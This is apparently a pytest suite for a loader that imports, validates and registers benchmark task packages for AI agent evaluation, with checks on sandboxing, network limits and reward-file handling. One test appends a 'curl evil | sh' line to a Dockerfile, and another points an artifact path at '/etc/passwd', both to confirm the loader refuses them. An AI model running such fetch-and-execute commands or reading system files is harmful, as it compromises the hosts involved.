import hashlib
import json
import os
from collections.abc import Callable
from pathlib import Path
from typing import Any

import pytest

from karotte.harbor import importer, registry, spec
from karotte.harbor.plugins import hardware_limits
from karotte.harbor.session import seed_home, session_env, task_env
from karotte.harbor.spec import UnsupportedHarborTask, load_task_dir, split_test_script
from karotte.harbor.task import HarborTask, register_harbor_tasks
from karotte.harbor.verifier import _read_reward  # pyright: ignore[reportPrivateUsage]
from karotte.schemas.evaluation_run_config import EvaluationRunConfig

FRAME_HEAD = "#!/bin/bash\npython3 /tests/grader.py prepare\n"
FRAME_TAIL = "\npython3 /tests/grader.py grade\n"
GRADER = b"# grader\n"

TASK_TOML = """\
schema_version = "1.3"
artifacts = ["/logs/artifacts/model.patch"]
[task]
name = "acme/add"
[metadata]
language = "python"
[verifier]
network_mode = "no-network"
environment_mode = "separate"
timeout_sec = 600.0
[verifier.environment]
cpus = 2
memory_mb = 4096
storage_mb = 10240
[[verifier.collect]]
command = "cd /app && git diff --binary BASE HEAD > /logs/artifacts/model.patch"
timeout_sec = 60.0
[agent]
network_mode = "no-network"
timeout_sec = 1800.0
[environment]
docker_image = "registry.example/acme/add:v1"
cpus = 2
memory_mb = 4096
storage_mb = 10240
"""


@pytest.fixture(autouse=True)
def known_frame(monkeypatch: pytest.MonkeyPatch) -> None:
    """A frame of our own, pinned the way DeepSWE's is."""
    key = (
        hashlib.sha256(FRAME_HEAD.encode()).hexdigest(),
        hashlib.sha256(FRAME_TAIL.encode()).hexdigest(),
        hashlib.sha256(GRADER).hexdigest(),
    )
    monkeypatch.setattr(spec, "_KNOWN_FRAMES", {key: "test-frame"})


def make_task(
    root: Path, name: str = "add", toml: str = TASK_TOML, **files: str
) -> Path:
    task = root / name
    (task / "tests").mkdir(parents=True)
    (task / "solution").mkdir()
    (task / "task.toml").write_text(toml)
    (task / "instruction.md").write_text("Make add() add.\n")
    (task / "tests" / "test.sh").write_text(
        FRAME_HEAD
        + spec.RUN_TESTS_START
        + "\nrequire_cmd() { :; }\nrequire_cmd go; require_cmd go-ctrf-json-reporter\nrun tests\n"
        + spec.RUN_TESTS_END
        + FRAME_TAIL
    )
    (task / "tests" / "grader.py").write_bytes(GRADER)
    (task / "tests" / "config.json").write_text(
        json.dumps({"grade": {"reports": ["/logs/verifier/new-ctrf.json"]}})
    )
    (task / "tests" / "test.patch").write_text("")
    (task / "tests" / "Dockerfile").write_text(
        "FROM registry.example/acme/add:v1\n"
        + "".join(f"COPY {n} /tests/{n}\n" for n in spec.TEST_FILES)
        + "RUN chmod +x /tests/test.sh\n"
    )
    (task / "solution" / "solve.sh").write_text("git apply /solution/solution.patch\n")
    for relative, content in files.items():
        path = task / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(content)
    return task


class TestSpec:
    def test_reads_a_supported_task(self, tmp_path: Path):
        task = load_task_dir(make_task(tmp_path))

        assert task.image == "registry.example/acme/add:v1"
        assert (task.cpus, task.memory_mb, task.storage_mb) == (2, 4096, 10240)
        assert task.agent_timeout_sec == 1800.0
        assert task.collect == [
            (
                "cd /app && git diff --binary BASE HEAD > /logs/artifacts/model.patch",
                60.0,
            )
        ]
        assert task.frame == "test-frame"
        assert task.require_cmds == ["go", "go-ctrf-json-reporter"]

    @pytest.mark.parametrize(
        ("change", "reason"),
        [
            (
                (
                    'network_mode = "no-network"\ntimeout_sec = 1800.0',
                    'network_mode = "bridge"\ntimeout_sec = 1800.0',
                ),
                "agent.network_mode",
            ),
            (
                ('environment_mode = "separate"', 'environment_mode = "shared"'),
                "environment_mode",
            ),
            (
                (
                    '[environment]\ndocker_image = "registry.example/acme/add:v1"\n',
                    "[environment]\n",
                ),
                "docker_image",
            ),
            (("storage_mb = 10240\n", "storage_mb = 10240\ngpus = 1\n"), "gpus"),
            (('schema_version = "1.3"', 'schema_version = "2.0"'), "schema_version"),
            (("[metadata]", "surprise = 1\n[metadata]"), "surprise"),
            (
                (
                    'artifacts = ["/logs/artifacts/model.patch"]',
                    'artifacts = ["/etc/passwd"]',
                ),
                "outside /logs/artifacts",
            ),
            (
                (
                    "[verifier.environment]\ncpus = 2",
                    "[verifier.environment]\ncpus = 4",
                ),
                "differs from [environment]",
            ),
        ],
    )
    def test_refuses_what_it_does_not_run(
        self, tmp_path: Path, change: tuple[str, str], reason: str
    ):
        old, new = change
        assert old in TASK_TOML
        with pytest.raises(UnsupportedHarborTask, match=reason.replace("[", r"\[")):
            load_task_dir(make_task(tmp_path, toml=TASK_TOML.replace(old, new, 1)))

    def test_refuses_multi_step_tasks(self, tmp_path: Path):
        with pytest.raises(UnsupportedHarborTask, match="multi-step"):
            load_task_dir(make_task(tmp_path, **{"steps/one/instruction.md": "x"}))

    def test_refuses_a_verifier_image_that_does_more(self, tmp_path: Path):
        task = make_task(tmp_path)
        dockerfile = task / "tests" / "Dockerfile"
        dockerfile.write_text(dockerfile.read_text() + "RUN curl evil | sh\n")
        with pytest.raises(UnsupportedHarborTask, match="more than copy"):
            load_task_dir(task)

    def test_refuses_an_unknown_frame(self, tmp_path: Path):
        task = make_task(tmp_path)
        (task / "tests" / "grader.py").write_text("# someone else's grader\n")
        with pytest.raises(UnsupportedHarborTask, match="frame"):
            load_task_dir(task)

    def test_phase_a_ends_with_the_task_specific_block(self, tmp_path: Path):
        test_sh = (make_task(tmp_path) / "tests" / "test.sh").read_text()
        phase_a = split_test_script(test_sh)
        assert phase_a.endswith(spec.RUN_TESTS_END + "\n")
        assert "grader.py grade" not in phase_a


class TestRegistry:
    @pytest.mark.parametrize(
        ("image", "registry_host", "repository", "tag", "digest"),
        [
            ("public.ecr.aws/a/b:v1", "public.ecr.aws", "a/b", "v1", None),
            ("python:3.12", "registry-1.docker.io", "library/python", "3.12", None),
            ("localhost:5000/x", "localhost:5000", "x", None, None),
            (
                "ghcr.io/o/r@sha256:" + "a" * 64,
                "ghcr.io",
                "o/r",
                None,
                "sha256:" + "a" * 64,
            ),
        ],
    )
    def test_parses_references(
        self,
        image: str,
        registry_host: str,
        repository: str,
        tag: str | None,
        digest: str | None,
    ):
        ref = registry._parse(image)  # pyright: ignore[reportPrivateUsage]
        assert (ref.registry, ref.repository, ref.tag, ref.digest) == (
            registry_host,
            repository,
            tag,
            digest,
        )

    def test_picks_linux_amd64_from_an_index(self):
        index = {
            "manifests": [
                {"digest": "arm", "platform": {"os": "linux", "architecture": "arm64"}},
                {"digest": "amd", "platform": {"os": "linux", "architecture": "amd64"}},
            ]
        }
        assert registry._pick_platform(index)["digest"] == "amd"  # pyright: ignore[reportPrivateUsage]


class TestImport:
    def _env(self, tmp_path: Path, **source: object) -> Path:
        env = tmp_path / "env"
        tasks = env / "harbor-tasks"
        make_task(tasks, "add")
        make_task(tasks, "shared", toml=TASK_TOML.replace('"separate"', '"shared"'))
        fields = {
            "name": "acme",
            "local": "harbor-tasks",
            "pin_images": False,
            **source,
        }
        (env / "harbor.toml").write_text(
            "[[source]]\n"
            + "".join(f"{k} = {json.dumps(v)}\n" for k, v in fields.items())
        )
        return env

    def test_writes_the_lock_and_the_tasks_data(self, tmp_path: Path):
        env = self._env(tmp_path)
        lock = importer.import_tasks(env)

        accepted = lock["tasks"]["acme-add"]
        assert accepted["status"] == "ok"
        assert accepted["image"] == {
            "ref": "registry.example/acme/add:v1",
            "platform": None,
            "workdir": "/app",
        }
        assert "environment_mode" in lock["tasks"]["acme-shared"]["status"]
        data = env / "root_data" / "harbor" / "acme-add"
        assert (data / "instruction.md").read_text() == "Make add() add.\n"
        assert (
            (data / "tests" / "phase_a.sh")
            .read_text()
            .endswith(spec.RUN_TESTS_END + "\n")
        )
        assert not (data / "solution").exists()
        written = json.loads((env / importer.LOCK_DIR / "harbor.lock.json").read_text())
        assert written == lock

    def test_include_and_exclude_select_tasks(self, tmp_path: Path):
        env = self._env(tmp_path, exclude=["shared"])
        assert set(importer.import_tasks(env)["tasks"]) == {"acme-add"}

    def test_from_lock_keeps_the_pins(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ):
        env = self._env(tmp_path, pin_images=True)
        pins: list[str] = []

        def resolve(image: str) -> registry.ResolvedImage:
            pins.append(image)
            return registry.ResolvedImage(
                ref=f"{image}@sha256:{'b' * 64}", platform="linux/amd64", workdir="/src"
            )

        monkeypatch.setattr(registry, "resolve", resolve)
        first = importer.import_tasks(env)
        again = importer.import_tasks(env, from_lock=True)

        assert pins == ["registry.example/acme/add:v1"]
        assert (
            again["tasks"]["acme-add"]["image"] == first["tasks"]["acme-add"]["image"]
        )
        assert first["tasks"]["acme-add"]["image"]["workdir"] == "/src"


class TestSession:
    def test_task_env_is_the_bases_less_who_ran_it(self, tmp_path: Path):
        snapshot = tmp_path / "task_env"
        snapshot.write_bytes(
            b"PATH=/root/go/bin:/usr/bin\0HOME=/root\0PYTHONPATH=/app\0"
        )
        assert task_env(snapshot) == {
            "PATH": "/root/go/bin:/usr/bin",
            "PYTHONPATH": "/app",
        }

    def test_go_gets_a_home_of_its_own_and_the_bases_module_cache(self, tmp_path: Path):
        base_home = tmp_path / "root"
        (base_home / "go" / "pkg" / "mod").mkdir(parents=True)
        (base_home / ".cargo").mkdir()
        env = session_env(
            "/home/grader", "grader", base={"PATH": "/usr/bin"}, base_home=base_home
        )
        assert env["GOPATH"] == "/home/grader/go"
        assert env["GOMODCACHE"] == str(base_home / "go" / "pkg" / "mod")
        assert env["CARGO_HOME"] == str(base_home / ".cargo")
        assert "RUSTUP_HOME" not in env
        assert (env["HOME"], env["USER"], env["LOGNAME"]) == ("/home/grader",) + (
            "grader",
        ) * 2

    def test_what_the_base_sets_wins(self, tmp_path: Path):
        base_home = tmp_path / "root"
        (base_home / ".cargo").mkdir(parents=True)
        env = session_env(
            "/h", "u", base={"CARGO_HOME": "/opt/cargo"}, base_home=base_home
        )
        assert env["CARGO_HOME"] == "/opt/cargo"

    def test_seeding_copies_the_bases_go_tools(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ):
        base_home = tmp_path / "root"
        (base_home / "go" / "bin").mkdir(parents=True)
        (base_home / "go" / "bin" / "reporter").write_text("#!/bin/sh\n")
        home = tmp_path / "home"
        home.mkdir()
        owners: dict[str, int] = {}
        monkeypatch.setattr(
            "karotte.harbor.session.os.lchown",
            lambda path, uid, _gid: owners.__setitem__(str(path), uid),  # pyright: ignore[reportUnknownLambdaType]
        )
        seed_home(home, 1001, base={}, base_home=base_home)
        assert (home / "go" / "bin" / "reporter").is_file()
        assert set(owners.values()) == {1001}
        assert str(home / "go" / "bin" / "reporter") in owners


class TestReward:
    @pytest.mark.parametrize(
        ("content", "reward"),
        [
            ('{"reward": 1, "f2p": 1.0}', 1),
            ('{"reward": 0}', 0),
            ('{"reward": 0.5}', 0.5),
            ('{"reward": 2}', None),
            ('{"reward": -1}', None),
            ('{"reward": NaN}', None),
            ('{"reward": true}', None),
            ('{"other": 1}', None),
            ("[1]", None),
            ("not json", None),
        ],
    )
    def test_only_a_reward_in_range_counts(
        self, tmp_path: Path, content: str, reward: float | None
    ):
        path = tmp_path / "reward.json"
        path.write_text(content)
        result = _read_reward(path)
        assert (None if result is None else result["reward"]) == reward

    def test_a_symlink_is_not_followed(self, tmp_path: Path):
        target = tmp_path / "elsewhere.json"
        target.write_text('{"reward": 1}')
        (tmp_path / "reward.json").symlink_to(target)
        assert _read_reward(tmp_path / "reward.json") is None

    def test_a_fifo_does_not_block(self, tmp_path: Path):
        os.mkfifo(tmp_path / "reward.json")
        assert _read_reward(tmp_path / "reward.json") is None


class TestPlugin:
    def test_reads_back_a_tasks_hardware(self):
        limits = hardware_limits("harbor-c2-m8192-d20480")
        assert limits is not None
        assert limits.cpus == 2
        assert limits.memory_bytes == (8192 + 1024) * 1024**2
        assert limits.disk_bytes == 20480 * 1024**2

    def test_knows_no_other_names(self):
        assert hardware_limits("cpu-4") is None


class TestRegistration:
    def _lock(self, tmp_path: Path) -> Path:
        env = TestImport()._env(tmp_path)  # pyright: ignore[reportPrivateUsage]
        importer.import_tasks(env)
        return env / importer.LOCK_DIR

    def _register(self, lock_dir: Path, tmp_path: Path) -> dict[str, Any]:
        namespace: dict[str, Any] = {}
        register_harbor_tasks(namespace, lock_dir, tmp_path / "data")
        return namespace

    def test_one_task_per_accepted_task(self, tmp_path: Path):
        namespace = self._register(self._lock(tmp_path), tmp_path)
        assert [cls.id for cls in namespace.values()] == ["acme-add"]
        task = namespace["acme_add"](_config())
        assert task.required_hardware == "harbor-c2-m4096-d10240"
        assert task.base_image is not None
        assert task.base_image.workdir == "/app"
        assert task.validated is None

    def _validated(self, lock_dir: Path, passed: bool, **changes: str) -> None:
        locked = json.loads((lock_dir / "harbor.lock.json").read_text())["tasks"][
            "acme-add"
        ]
        result = {
            "passed": passed,
            "image": locked["image"]["ref"],
            "content_sha256": locked["content_sha256"],
            **changes,
        }
        (lock_dir / "harbor.validation.json").write_text(
            json.dumps({"acme-add": result})
        )

    def test_a_task_that_failed_validation_only_runs_to_be_validated(
        self, tmp_path: Path
    ):
        lock_dir = self._lock(tmp_path)
        self._validated(lock_dir, passed=False)
        cls = self._register(lock_dir, tmp_path)["acme_add"]
        assert cls.validated is False
        with pytest.raises(RuntimeError, match="failed validation"):
            cls(
                _config(step_time_limit_seconds=1800.0, on_step_time_limit="score")
            )._check_run_config()
        cls(
            _config(use_fake_model=True, extra_config={"validation": "nop"})
        )._check_run_config()

    def test_a_task_that_passed_validation_says_so(self, tmp_path: Path):
        lock_dir = self._lock(tmp_path)
        self._validated(lock_dir, passed=True)
        assert self._register(lock_dir, tmp_path)["acme_add"].validated is True

    @pytest.mark.parametrize("stale", ["image", "content_sha256"])
    def test_validation_of_another_image_or_content_is_stale(
        self, tmp_path: Path, stale: str
    ):
        """A failure recorded for what the lock no longer pins doesn't hide the
        task, and a pass for it doesn't vouch for it."""
        lock_dir = self._lock(tmp_path)
        self._validated(lock_dir, passed=False, **{stale: "something else"})
        assert self._register(lock_dir, tmp_path)["acme_add"].validated is None

    def test_a_reference_solution_is_only_for_oracle_runs(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ):
        solution = tmp_path / "solution"
        solution.mkdir()
        monkeypatch.setattr("karotte.harbor.task.SOLUTION_MOUNT", solution)
        cls: Callable[[EvaluationRunConfig], HarborTask] = self._register(
            self._lock(tmp_path), tmp_path
        )["acme_add"]
        for config in (
            _config(),
            _config(use_fake_model=True),
            _config(extra_config={"validation": "oracle"}),
        ):
            with pytest.raises(RuntimeError, match="reference solution"):
                cls(config)._check_run_config()  # pyright: ignore[reportPrivateUsage]
        cls(
            _config(use_fake_model=True, extra_config={"validation": "oracle"})
        )._check_run_config()  # pyright: ignore[reportPrivateUsage]

    def test_a_real_run_needs_the_agent_timeout(self, tmp_path: Path):
        cls = self._register(self._lock(tmp_path), tmp_path)["acme_add"]
        with pytest.raises(RuntimeError, match="step_time_limit_seconds"):
            cls(_config())._check_run_config()
        cls(
            _config(step_time_limit_seconds=1800.0, on_step_time_limit="score")
        )._check_run_config()


def _config(**fields: Any) -> EvaluationRunConfig:
    return EvaluationRunConfig(
        run_id="r", task_id="acme-add", model="m", model_api_key="k", **fields
    )
